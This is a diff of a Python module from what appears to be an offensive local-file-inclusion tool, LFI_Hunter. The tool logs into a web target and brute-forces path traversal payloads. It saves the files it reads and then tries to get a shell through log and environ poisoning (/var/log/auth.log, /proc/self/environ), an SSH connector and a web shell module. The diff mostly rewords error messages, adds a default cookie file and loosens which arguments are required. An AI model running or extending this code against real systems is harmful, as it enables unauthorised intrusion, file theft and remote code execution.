@@ -30,7 +30,10 @@ class Local_File_In:
             try:   
                 if self.args.Cookie  or self.args.config:
                    with open(self.args.Cookie,'r') as Cookie_file :
-                      self.Cookie =  Cookie_file.read()  
+                      self.Cookie =  Cookie_file.read()
+                elif not self.args.Cookie or self.args.config:
+                    with open("./Package/ConfigFile/.Cookie.txt",'r') as Cookie_file :
+                        self.Cookie = Cookie_file.read()      
             except Exception as e :
                    print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                    print("[*] Error : ",e )
@@ -45,16 +48,15 @@ class Local_File_In:
                   print("[+] username            : ................ | : "+self.args.user.replace("\n",''))
                   print("[+] Login password      : ................ | : "+self.args.password)
                except Exception as e:
-                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                  print("[*] Error : ",e )
-                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                  print("[*] Chech login info UserName and Password ")
-                  print("[*] Should use --loginurl <url> --username <username> --password <password>")
-                  print("[*] Should username and Password is True")
-                  print("[*] Example : --url lodinurl http://10.10.10.44/login.php --user admin --password admim")
-                  print("[*] ckeck Readme file at : https://www.github/jac11/LFI_Hunter.git")
-                  exit()                    
-                  
+                    print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                    print("[*] Error: ", e)
+                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
+                    print("[*] Verify the login information: username and password.")
+                    print("[*] Use the following format: --loginurl <url> --username <username> --password <password>")
+                    print("[*] Ensure the username and password are correct.")
+                    print("[*] Example: --loginurl http://10.10.10.44/login.php --user admin --password admin")
+                    print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")
+                    exit()                                                
             if self.args.filelist:
                 print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
             else:
@@ -65,21 +67,21 @@ class Local_File_In:
             print("[+] web Cookies         : ................ | : "+self.Cookie)   
             if self.args.auth and self.args.Vulnurl\
             and self.args.password and self.args.user\
-            and self.args.Cookie and self.args.loginurl :
+            and self.args.loginurl :
                  Local_File_In.Login_auth(self)
                  Local_File_In.file_name(self)
                  Local_File_In.url_request(self)
             elif not self.args.auth and self.args.Vulnurl\
-            and not self.args.password and not self.args.user and self.args.Cookie :
+            and not self.args.password and not self.args.user :
                 Local_File_In.url_request(self)                
             else:
-                print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                print("[*] Error :  Bad argument Logic command  Error" )
-                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ') 
-                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
-                print("[*] ckeck Readme file at      : https://www.github/jac11/LFI_Hunter.git")
-                exit()                   
+                print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                print("[*] Error: Bad argument logic command error")
+                print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
+                print('[+] To use LFI with login      : --auth --loginurl --vulnurl --user --password --filelist --cookie') 
+                print('[+] To use LFI without login   : --vulnurl --filelist --cookie') 
+                print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")
+                exit()                              
         def Login_auth(self,**kwargs):
             try:
                loginurl = self.args.loginurl
@@ -102,15 +104,15 @@ class Local_File_In:
                         try:
                            request.select_form(nr = 3)
                         except Exception:
-                             try:
+                            try:
                                 request.select_form(nr = 4)
-                             except Exception as e:
-                                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                                  print("[*] Error : ",e )
-                                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                                  print("[*] try to use with out login Mothead") 
-                                  print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
-                                  exit()                                   
+                            except Exception as e:
+                                print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                                print("[*] Error: ", e)
+                                print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
+                                print("[*] Try using the method without login authentication.")
+                                print('[+] To use LFI without login: --vulnurl --filelist --cookie')
+                                exit()                                   
                                  
                if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                    request["username"] = f'{self.args.user}'
@@ -129,13 +131,13 @@ class Local_File_In:
                content    = response.read()  
                self.url = response.geturl()
             except urllib.error.URLError as e:
-                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                    print("[*] Error : ",e )
-                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                   print("[*] Follow url Format ")
+                   print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTIONS\n" + '=' * 14 + '\n')
+                   print("[*] Use the following format ")
                    print("[*] url Format : http/https://<ip>:<port>/<dir>")  
-                   print("[*] Example : http://10.10.10.193:4000/page=index.php")
-                   exit() 
+                   print("[*] Example : http://10.10.10.193:4000/login.php")
+                   exit()
             except KeyboardInterrupt :
                    exit()
           
@@ -151,13 +153,13 @@ class Local_File_In:
                if not os.path.exists('./FileStore/'+self.ip_re+"/"):
                   os.makedirs('./FileStore/'+self.ip_re+"/")
             except AttributeError as e:
-                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                  print("[*] Error : ",e )
-                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                  print("[*] Follow url Format ")
-                  print("[*] url Format : http/https://<ip>:<port>/<dir>")  
-                  print("[*] Example : http://10.10.10.193:4000/page=index.php")
-                  exit()                    
+                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                   print("[*] Error : ",e )
+                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                   print("[*] Use the following format ")
+                   print("[*] url Format : http/https://<ip>:<port>/<dir>")  
+                   print("[*] Example : http://10.10.10.193:4000/login.php")
+                   exit()                
             ssl._create_default_https_context = ssl._create_unverified_context 
             if not self.args.filelist:
                    self.args.filelist= './Package/LFI-wordlist.txt'
@@ -167,11 +169,11 @@ class Local_File_In:
                with open(self.args.filelist,'r') as readline :
                     pass
             except FileNotFoundError as e:
-                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
                    print("[*] Error : ",e )
-                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                   print("[*] chech the file path  to your own LFL Wordlist  -F /--filelist")
-                   print("[*] try to use Default Path without -F/--filelist")  
+                   print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                   print("[*] Check the file path to your custom LFI wordlist using -F/--filelist.")
+                   print("[*] Alternatively, try using the default path without specifying -F/--filelist.")
                    exit()
             with open(self.args.filelist,'r') as readline :        
                 command_dir = readline.readlines()
@@ -204,16 +206,16 @@ class Local_File_In:
                         self._first_req = request.open(self.args.Vulnurl).read()                                                      
                         self.Get_Oregnal_URL = request.open(self.url).read()
                     except Exception  as e :
-                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                         print("[*] Error : ",e )
-                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                         print("[*] Follow url Format ")
-                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
-                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
-                         exit()   
+                           print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                           print("[*] Error : ",e )
+                           print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                           print("[*] Use the following format ")
+                           print("[*] url Format : http/https://<ip>:<port>/<dir>")  
+                           print("[*] Example : http://10.10.10.193:4000/login.php?login=")
+                           exit()       
                     except KeyboardInterrupt:
                        exit()        
-                    print('='*20+"\n[*] Brute Force "+'\n'+'='*30+'\n')
+                    print('='*20+"\n[*] Brute force Method "+'\n'+'='*30+'\n')
                     print("[+] Testing payload     : ................ | : "+self.url[-50:].replace('\\n',''))
 
                     sys.stdout.write('\x1b[1A')
@@ -250,7 +252,7 @@ class Local_File_In:
                         Local_File_In.file_name(self)
                         from Package.FileStore import FileManager
                         FileManager.FileRStore_Write(self,args=self.control)
-                        print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
+                        print('='*20+"\n[*] Path Traversal "+'\n'+'='*30+'\n')
                         print("[+] File request        : ................ | : "+self.args.read.replace('\n','').replace("-","/")) 
                         print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                         print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
@@ -279,18 +281,18 @@ class Local_File_In:
                                     Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                     exit()
                                 else:
-                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
-                                      time.sleep(1)
-                                      print("[*] FILE : ", self.args.read)
-                                      time.sleep(1)
-                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
-                                      time.sleep(1)
-                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
-                                      print("[*] Example : --read /var/log/auth.log ")
-                                      print("[*] Example : --read /proc/self/environ")
-                                      print("[*] Example : --read /var/log/auth")
-                                      exit()   
+                                    print('\n' + '=' * 20 + "\n[*] SHELL INFORMATION\n" + '=' * 30 + '\n')
+                                    time.sleep(1)
+                                    print("[*] FILE: ", self.args.read)
+                                    time.sleep(1)
+                                    print("[*] INFO: Unable to add PHP code to", self.args.read)
+                                    time.sleep(1)
+                                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
+                                    print("[*] To obtain a shell, try using --read with the 'environ' or 'auth' log file.")
+                                    print("[*] Example : --read /var/log/auth.log ")
+                                    print("[*] Example : --read /proc/self/environ")
+                                    print("[*] Example : --read /var/log/auth")
+                                    exit()  
                         elif self.args.webshell or self.args.config:
                             from Package.webshell import WebShellInteract    
                             if 'auth' in self.url or 'auth.log' in self.url:
@@ -308,7 +310,7 @@ class Local_File_In:
                         FileManager.FileRStore_Write(self,args=self.control)
                         print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                         print("[+] Vulnerable Link     : ................ | : "+self.url)
-                        print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
+                        print('='*20+"\n[*] Path Traversal "+'\n'+'='*30+'\n')
                         print("[+] File request        : ................ | : "+self.args.read.replace('\n','').replace("-","/")) 
                         print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))          
                         print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
@@ -337,18 +339,18 @@ class Local_File_In:
                                     Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                     exit()
                                 else:
-                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
-                                      time.sleep(1)
-                                      print("[*] FILE : ", self.args.read)
-                                      time.sleep(1)
-                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
-                                      time.sleep(1)
-                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
-                                      print("[*] Example : --read /var/log/auth.log ")
-                                      print("[*] Example : --read /proc/self/environ")
-                                      print("[*] Example : --read /var/log/auth")
-                                      exit()
+                                    print('\n' + '=' * 20 + "\n[*] SHELL INFORMATION\n" + '=' * 30 + '\n')
+                                    time.sleep(1)
+                                    print("[*] FILE: ", self.args.read)
+                                    time.sleep(1)
+                                    print("[*] INFO: Unable to add PHP code to", self.args.read)
+                                    time.sleep(1)
+                                    print('\n' + '=' * 10 + "\n[*] POSSIBLE SOLUTION\n" + '=' * 14 + '\n')
+                                    print("[*] To obtain a shell, try using --read with the 'environ' or 'auth' log file.")
+                                    print("[*] Example : --read /var/log/auth.log ")
+                                    print("[*] Example : --read /proc/self/environ")
+                                    print("[*] Example : --read /var/log/auth")
+                                    exit()  
                         elif self.args.webshell or self.args.config:
                             from Package.webshell import WebShellInteract    
                             if 'auth' in self.url or 'auth.log' in self.url:
@@ -362,11 +364,14 @@ class Local_File_In:
                             exit()                           
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                 print("[*] No Data found")
+                print("[*] No Permission To read the File")
                 print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                print("[*] try to use Defrant LFI wordlist ")
+                print("[*] try to use new cookie ")
+                print("[*] try to use aggressive mode ")                
                 if not self.args.base64:
-                   print("[*] try to use PHP Filter bu useing -B64/--base64 ")  
-                exit()                   
+                   print("[*] try to use PHP Filter by useing -B/--base64 ")  
+                print("[*] Refer to the README file at: https://www.github.com/jac11/LFI_Hunter.git")   
+                exit()                          
         def file_name (self,**kwargs):
             self.args.read = "-".join(str("".join(re.findall('=.+',self.url))).split("/")[-2:])
             try:
